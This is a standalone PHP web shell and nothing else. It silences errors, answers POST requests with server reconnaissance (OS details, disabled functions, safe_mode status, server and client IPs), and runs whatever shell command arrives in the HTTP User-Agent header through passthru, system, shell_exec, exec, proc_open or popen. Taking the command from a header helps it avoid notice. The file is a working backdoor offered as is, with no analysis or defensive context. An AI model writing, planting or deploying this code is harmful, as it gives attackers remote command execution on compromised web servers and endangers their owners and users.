<?php set_time_limit(0);
error_reporting(0);
if (isset($_POST['disable_functions'])) {
    echo (!empty(ini_get('disable_functions')) ? ini_get('disable_functions') : 'NONE');
    die();
}
if (isset($_POST['unamea'])) {
    echo php_uname('a');
    die();
}
if (isset($_POST['server'])) {
    echo (!empty(getenv('SERVER_SOFTWARE'))) ? getenv('SERVER_SOFTWARE') : '';
    die();
}
if (isset($_POST['safe_mode'])) {
    echo (ini_get('safe_mode') == 1) ? 'ON' : 'OFF';
    die();
}
if (isset($_POST['server_ip'])) {
    echo (!empty(getenv('SERVER_ADDR'))) ? getenv('SERVER_ADDR') : '';
    die();
}
if (isset($_POST['client_ip'])) {
    echo (!empty(getenv('REMOTE_ADDR'))) ? getenv('REMOTE_ADDR') : '';
    die();
}
if ($_POST['cmd'] == "passthru") {
    passthru($_SERVER['HTTP_USER_AGENT']);
} elseif ($_POST['cmd'] == "system") {
    system($_SERVER['HTTP_USER_AGENT']);
} elseif ($_POST['cmd'] == "shell_exec") {
    echo shell_exec($_SERVER['HTTP_USER_AGENT']);
} elseif ($_POST['cmd'] == "exec") {
    echo exec($_SERVER['HTTP_USER_AGENT']);
} elseif ($_POST['cmd'] == "proc_open") {
    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );

    $process = proc_open($_SERVER['HTTP_USER_AGENT'], $descriptorspec, $pipes);
    if (is_resource($process)) {
        fclose($pipes[0]);        
        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);       
        $error = stream_get_contents($pipes[2]);
        fclose($pipes[2]);        
        proc_close($process);
        echo $output;
        if (!empty($error)) {
            echo "Error: " . $error;
        }
    }
} elseif ($_POST['cmd'] == "popen") {
    $handle = popen($_SERVER['HTTP_USER_AGENT'], 'r');
    if ($handle) {
        while (!feof($handle)) {
            echo fread($handle, 8192);
        }
        pclose($handle);
    }
}

